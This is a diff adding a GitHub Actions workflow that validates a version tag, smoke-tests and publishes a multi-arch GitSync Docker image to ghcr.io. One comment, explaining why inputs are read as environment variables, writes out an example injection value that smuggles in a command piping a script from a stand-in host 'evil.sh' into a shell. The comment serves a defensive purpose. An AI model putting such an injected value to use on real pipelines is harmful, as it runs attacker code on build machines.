@@ -1,0 +1,150 @@
+name: Publish image
+
+# Nothing automatic: no push trigger, no schedule. Publishing an image is a
+# decision, so it happens when you go to the Actions tab and start it - and the
+# job refuses to run from anywhere but main.
+on:
+  workflow_dispatch:
+    inputs:
+      version:
+        description: "Version tag, e.g. 2.0.0 (a leading v is fine, it is stripped)"
+        required: true
+        type: string
+      latest:
+        description: "Also move :latest onto this image"
+        required: false
+        default: true
+        type: boolean
+      platforms:
+        description: "Architectures to build for"
+        required: false
+        default: linux/amd64,linux/arm64
+        type: string
+
+# The text on the GHCR package page (max 512 characters). It has to be an
+# annotation on the image index: this image is multi-arch, and GHCR shows no
+# label from a multi-arch image. Kept identical to the Dockerfile's label, which
+# is what `docker inspect` shows - tests/test_docker.py checks the two match.
+env:
+  IMAGE_DESCRIPTION: 'Back up your GitHub repositories - mirror them to GitLab with full history or zip them up (full git mirrors or just the code). Run it once or keep it running on a cron schedule (CRON_SCHEDULE). Runs unprivileged with everything in the /data volume - masks tokens in every log line and never runs two backups at once. Setup and docs: https://github.com/scienmanas/GitSync'
+
+permissions:
+  contents: read
+  packages: write     # pushing to ghcr.io needs nothing beyond GITHUB_TOKEN
+
+jobs:
+  publish:
+    runs-on: ubuntu-latest
+    # The dispatch dropdown offers every branch; only main ever ships an image.
+    if: github.ref == 'refs/heads/main'
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v7
+
+      - name: Work out the tags
+        id: tags
+        # The inputs come in as environment variables rather than being pasted
+        # into the script. ${{ }} is substituted as text before bash sees the
+        # line, so a version of `1.0"; curl evil.sh | sh; #` would be executed;
+        # read back as "$VERSION" it is only ever data, whatever it contains.
+        env:
+          OWNER: ${{ github.repository_owner }}
+          VERSION: ${{ inputs.version }}
+          LATEST: ${{ inputs.latest }}
+        run: |
+          version="${VERSION#v}"          # a leading v is fine, and dropped here
+
+          # Docker tags allow letters, digits, dot, underscore and dash, and may
+          # not start with a separator. Checking now turns a typo into an
+          # immediate error instead of a failed push several minutes of build later.
+          case "$version" in
+            "" | *[!A-Za-z0-9._-]* | [!A-Za-z0-9]*)
+              echo "::error::'$VERSION' is not a usable image tag - letters, digits, dot, underscore and dash only, starting with a letter or digit"
+              exit 1
+              ;;
+          esac
+
+          image="ghcr.io/${OWNER}/gitsync"
+          # The commit tag is the one that is never reused, so a deployment can
+          # always be traced back to an exact tree.
+          tags="${image}:${version},${image}:sha-$(git rev-parse --short HEAD)"
+          if [ "$LATEST" = "true" ]; then
+            tags="${tags},${image}:latest"
+          fi
+
+          echo "tags=${tags}" >> "$GITHUB_OUTPUT"
+          echo "version=${version}" >> "$GITHUB_OUTPUT"
+          echo "Publishing: ${tags}"
+
+      - name: Set up QEMU
+        # arm64 is emulated here; the runner itself is amd64
+        uses: docker/setup-qemu-action@v3
+
+      - name: Set up Buildx
+        uses: docker/setup-buildx-action@v3
+
+      - name: Build for this runner and smoke-test it
+        # Single arch and loaded into the local daemon, so the image can be run
+        # before anything is published. The layers are cached for the real build.
+        uses: docker/build-push-action@v6
+        with:
+          context: .
+          load: true
+          tags: gitsync:candidate
+          build-args: VERSION=${{ steps.tags.outputs.version }}
+          cache-from: type=gha
+          cache-to: type=gha,mode=max
+
+      - name: The image runs
+        run: |
+          docker run --rm gitsync:candidate --help
+          docker run --rm gitsync:candidate archive --help
+          # With no credentials it must say so and exit 1, not hang or traceback.
+          # Captured rather than run bare, because the step aborts on a failure.
+          status=0
+          docker run --rm gitsync:candidate sync || status=$?
+          test "$status" -eq 1
+
+      - name: Log in to ghcr.io
+        uses: docker/login-action@v3
+        with:
+          registry: ghcr.io
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Build every architecture and push
+        uses: docker/build-push-action@v6
+        with:
+          context: .
+          platforms: ${{ inputs.platforms }}
+          push: true
+          tags: ${{ steps.tags.outputs.tags }}
+          build-args: VERSION=${{ steps.tags.outputs.version }}
+          # On the index, which is what GHCR reads for a multi-arch image
+          annotations: |
+            index:org.opencontainers.image.description=${{ env.IMAGE_DESCRIPTION }}
+            index:org.opencontainers.image.source=https://github.com/${{ github.repository }}
+            index:org.opencontainers.image.licenses=MIT
+          cache-from: type=gha
+          cache-to: type=gha,mode=max
+
+      - name: Summary
+        # Same rule as above - these values started life as an input, so they
+        # arrive as environment variables and never as pasted-in text.
+        env:
+          OWNER: ${{ github.repository_owner }}
+          TAGS: ${{ steps.tags.outputs.tags }}
+          VERSION: ${{ steps.tags.outputs.version }}
+        run: |
+          {
+            echo "### Published"
+            echo
+            echo '```'
+            echo "$TAGS" | tr ',' '\n'
+            echo '```'
+            echo
+            echo "Pull it with:"
+            echo '```sh'
+            echo "docker pull ghcr.io/${OWNER}/gitsync:${VERSION}"
+            echo '```'
+          } >> "$GITHUB_STEP_SUMMARY"
